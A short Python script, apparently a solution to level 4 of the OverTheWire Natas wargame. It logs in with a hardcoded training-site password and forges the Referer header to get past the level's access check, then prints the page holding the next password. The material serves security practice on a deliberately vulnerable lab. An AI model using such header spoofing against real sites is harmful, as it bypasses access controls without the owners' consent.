import requests

url = "http://natas4.natas.labs.overthewire.org/"
referer = "http://natas5.natas.labs.overthewire.org/"

session = requests.Session()
session.auth = ('natas4', 'QryZXc2e0zahULdHrtHxzyYkj59kUxLQ')
session.headers.update({'referer' : referer})

password = session.get(url)
print(password.text)

